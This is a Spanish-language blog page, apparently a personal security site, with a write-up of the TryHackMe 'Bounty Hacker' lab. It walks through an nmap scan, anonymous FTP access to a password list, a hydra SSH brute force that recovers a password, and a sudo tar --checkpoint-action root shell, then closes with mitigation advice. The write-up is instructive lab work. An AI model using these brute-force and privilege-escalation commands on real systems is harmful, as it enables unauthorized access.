@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Bounty Hacker TryHackMe | ZsZsec</title>
+<meta content="Introduccion Esta máquina fue comprometida combinando un reconocimiento clásico con abuso de servicios con configuraciones inseguras. El flujo general fue: 1. Reconocimiento con nm..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina Bounty Hacker TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / hydra / ssh</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">hydra</span><span class="tag">ssh</span><span class="tag">FTP</span><span class="tag">sudo</span><span class="tag">tar</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Introduccion</h1>
+<p>Esta máquina fue comprometida combinando un reconocimiento clásico con abuso de servicios con configuraciones inseguras. El flujo general fue:</p>
+<ol>
+<li>Reconocimiento con <code>nmap</code> para identificar servicios expuestos.</li>
+<li>Acceso anónimo a FTP y descarga de archivos que contenían un posible usuario y una lista de contraseñas.</li>
+<li>Fuerza bruta dirigida contra SSH usando <code>hydra</code> con el usuario descubierto y la lista de contraseñas.</li>
+<li>Autenticación exitosa como <code>lin</code> vía SSH.</li>
+<li>Revisión de privilegios (<code>sudo -l</code>) y explotación de <code>tar</code> con <code>--checkpoint-action</code> para obtener shell con UID 0.
+En la sección que sigue describo paso a paso las acciones, evidencia (salidas de comandos) y explicaciones técnicas. Finalizo con recomendaciones de mitigación y lecciones aprendidas.</li>
+</ol>
+<h2>Entorno y objetivos</h2>
+<ul>
+<li>IP objetivo: <code>10.10.69.169</code></li>
+<li>Objetivo del ejercicio: enumerar, obtener acceso (user) y escalar a <code>root</code>.</li>
+<li>Herramientas principales utilizadas: <code>nmap</code>, <code>ftp</code> cliente, <code>hydra</code>, <code>ssh</code>, <code>sudo</code>, <code>tar</code>.</li>
+</ul>
+<h1>Reconocimiento — <code>nmap</code></h1>
+<p>Se realizó un escaneo agresivo para descubrir servicios y versiones:</p>
+<pre><code class="language-bash">└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.10.69.169 -oN nmap.txt 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 09:52 CDT
+Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 09:53 (0:00:03 remaining)                                 
+Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                            
+Service scan Timing: About 100.00% done; ETC: 09:53 (0:00:00 remaining)                                
+Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                             
+NSE Timing: About 97.89% done; ETC: 09:53 (0:00:00 remaining)                                          
+Nmap scan report for 10.10.69.169                                                                      
+Host is up (0.16s latency).                                                                            
+Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)                      
+PORT   STATE SERVICE VERSION                                                                           
+21/tcp open  ftp     vsftpd 3.0.5                                                                      
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 550 Permission denied.
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.23.120.245
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 2a:8c:39:b8:58:e7:74:5b:4d:ae:d4:2a:79:21:05:9c (RSA)
+|   256 ca:2c:1e:a7:6f:48:41:75:91:44:9c:4c:b6:05:e2:35 (ECDSA)
+|_  256 c8:d4:8c:ba:e1:88:e4:3a:b2:bc:31:6c:14:60:7f:ef (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>Salida relevante:</p>
+<pre><code class="language-bash">21/tcp open ftp vsftpd 3.0.5
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+80/tcp open http Apache httpd 2.4.41
+</code></pre>
+<p><strong>Observaciones:</strong></p>
+<ul>
+<li>FTP permite login anónimo (esto fue confirmado más adelante).</li>
+<li>SSH y HTTP están abiertos, por lo que se puede intentar obtención de credenciales a través de información en servicios públicos (FTP) o fuerza bruta dirigida.</li>
+</ul>
+<h2>Acceso a FTP anónimo y enumeración de archivos</h2>
+<p>Se intentó login anónimo con el cliente <code>ftp</code>:</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/bountyhacker]
+└─$ ftp 10.10.69.169 21 
+Connected to 10.10.69.169.
+220 (vsFTPd 3.0.5)
+Name (10.10.69.169:zikuta): anonymous
+230 Login successful.
+</code></pre>
+<p>Se listaron los archivos visibles y se descargaron los que eran accesibles:</p>
+<pre><code class="language-bash">ftp&gt; ls
+550 Permission denied.
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+</code></pre>
+<h3>Contenido de <code>task.txt</code></h3>
+<pre><code class="language-bash">└─$ strings task.txt                   
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+-lin
+</code></pre>
+<p><strong>Interpretación:</strong> el archivo contiene una firma <code>-lin</code> que sugiere un nombre de usuario potencial — <code>lin</code>.</p>
+<h3>Contenido de <code>locks.txt</code></h3>
+<p>El archivo es una lista de cadenas que claramente parecen contraseñas o variaciones de una contraseña base (muchas combinaciones con mayúsculas, números y símbolos). Ejemplos:</p>
+<pre><code class="language-bash">$ strings locks.txt                               
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+            
+</code></pre>
+<p><strong>Interpretación:</strong> tenemos una <strong>lista de contraseñas</strong> potenciales y un <strong>usuario candidato</strong> (<code>lin</code>). Esto permite lanzar una fuerza bruta dirigida contra servicios de autenticación.</p>
+<h2>Ataque de fuerza bruta contra SSH con <code>hydra</code></h2>
+<p>Se usó <code>hydra</code> para probar el usuario <code>lin</code> con el archivo <code>locks.txt</code> como diccionario:</p>
+<pre><code class="language-bash">hydra -l lin -P locks.txt ssh://10.10.69.169
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 10:33:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.10.69.169:22/
+[22][ssh] host: 10.10.69.169   login: lin   password: RedDr4gonSynd1cat3      
+</code></pre>
+<p><strong>Notas:</strong></p>
+<ul>
+<li>El éxito se obtuvo por la combinación de un usuario correcto (<code>lin</code>) y una de las variantes de password presentes en <code>locks.txt</code>.</li>
+<li>En entornos reales, tenga en cuenta las limitaciones de intentos en SSH y políticas de bloqueo/alarma — aquí fue un laboratorio controlado.</li>
+</ul>
+<h2>Acceso inicial — SSH</h2>
+<p>Con las credenciales encontradas se abrió sesión SSH:</p>
+<pre><code class="language-bash">lin@ip-10-10-69-169:~/Desktop$ ls
+user.txt
+</code></pre>
+<h2>Enumeración local y chequeo de sudo</h2>
+<p>Comprobación de privilegios con <code>sudo -l</code>:</p>
+<pre><code class="language-bash">lin@ip-10-10-69-169:~/Desktop$ sudo -l 
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-10-69-169:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on ip-10-10-69-169:
+    (root) /bin/tar
+</code></pre>
+<p><strong>Interpretación clave:</strong> el usuario <code>lin</code> puede ejecutar <code>/bin/tar</code> <strong>como root</strong> sin necesidad de contraseña. Esto abre una vía de escalada porque <code>tar</code> tiene opciones que permiten ejecutar comandos arbitrarios en el contexto del proceso (con los privilegios del proceso padre cuando se ejecuta con <code>sudo</code>).</p>
+<h3>Escalada de privilegios — abuso de <code>tar</code> (<code>--checkpoint-action</code>)</h3>
+<p>Se aprovechó la opción de <code>tar</code> <code>--checkpoint-action=exec</code> que permite ejecutar un comando en cada checkpoint. Al ejecutar <code>tar</code> con <code>sudo</code>, el comando se ejecuta con UID <code>0</code>.</p>
+<pre><code class="language-bash">lin@ip-10-10-69-169:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>Este comando lo que hace</p>
+<ul>
+<li><code>sudo</code>: ejecuta el comando siguiente con permisos de root.</li>
+<li><code>tar</code>: el binario de GNU tar (el que se ejecuta con <code>sudo</code>).</li>
+<li><code>-c</code>: crear un archivo (modo creación).</li>
+<li><code>-f /dev/null</code>: escribir el archivo de salida en <code>/dev/null</code> (es decir, no crear nada persistente).</li>
+<li><code>/dev/null</code>: es el archivo que <code>tar</code> incluye en el archivo (prácticamente nada).</li>
+<li><code>--checkpoint=1</code>: le dice a <code>tar</code> que ejecute una "acción de checkpoint" después de procesar 1 entrada — es un mecanismo de tar para hacer acciones periódicas durante su ejecución.</li>
+<li><code>--checkpoint-action=exec=/bin/sh</code>: <strong>la parte clave</strong> — le dice a <code>tar</code> que, en el checkpoint, ejecute el comando <code>/bin/sh</code>.</li>
+</ul>
+<h1>¿Por qué esto escala privilegios?</h1>
+<p>Si el usuario puede ejecutar <code>tar</code> con <code>sudo</code> (es decir, <code>sudo tar ...</code> está permitido en <code>/etc/sudoers</code>), entonces <code>tar</code> corre como root. La opción <code>--checkpoint-action=exec=...</code> permite a <code>tar</code> ejecutar arbitrariamente un comando (a menudo usando <code>system()</code> o similar) <strong>pero con el UID efectivo del proceso de tar</strong> — en este caso root. Por tanto, <code>tar</code> ejecuta <code>/bin/sh</code> como root, lo que te deja con una shell interactiva con UID 0 (root). En la práctica verás un <code>#</code> y <code>id</code> mostrará <code>uid=0(root)</code>.</p>
+<h2>Recomendaciones de mitigación</h2>
+<ol>
+<li><strong>Eliminar el acceso</strong> <code>**sudo**</code> <strong>irrestricto a binarios capaces de ejecutar comandos arbitrarios.</strong> En este caso, <code>lin</code> tenía permiso para ejecutar <code>/bin/tar</code> como root. Si realmente necesita ejecutar <code>tar</code> con privilegios, restrinja los argumentos permitidos o utilice mecanismos de elevación más seguros.</li>
+<li><strong>Auditoría de usuarios con permisos</strong> <code>**sudo**</code><strong>.</strong> Revisar <code>/etc/sudoers</code> y los archivos en <code>/etc/sudoers.d/</code> para verificar que los derechos concedidos sean mínimos y justificados.</li>
+<li><strong>Desactivar FTP anónimo si no es necesario.</strong> El soporte de acceso anónimo a FTP permitió obtener información sensible solo por estar disponible públicamente.</li>
+<li><strong>Políticas de contraseñas más fuertes y protección contra fuerza bruta.</strong> Las listas de contraseñas presentes en FTP facilitaron el acceso. Implementar bloqueo por múltiples intentos fallidos en servicios de autenticación y usar autenticación multifactor cuando sea posible.</li>
+<li><strong>Registro y monitorización.</strong> Habilitar alertas para inicios de sesión por SSH desde IPs inusuales y uso de <code>sudo</code> por parte de usuarios no esperados.</li>
+<li><strong>Principio de menor privilegio para servicios y cuentas de servicio.</strong> Evitar dejar listas de contraseñas o notas con credenciales en ubicaciones accesibles públicamente.</li>
+</ol>
+<h2>Conclusión</h2>
+<p>La máquina fue comprometida exitosamente mediante una cadena de fallos de configuración: información sensible (usuario y lista de contraseñas) disponible en FTP anónimo, seguido por fuerza bruta dirigida a SSH y una escalada de privilegios simple pero efectiva gracias a permisos sudo mal configurados para <code>/bin/tar</code>. La mitigación pasa por eliminar credenciales en servicios públicos, endurecer <code>sudoers</code> y aplicar controles de acceso y monitorización.</p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
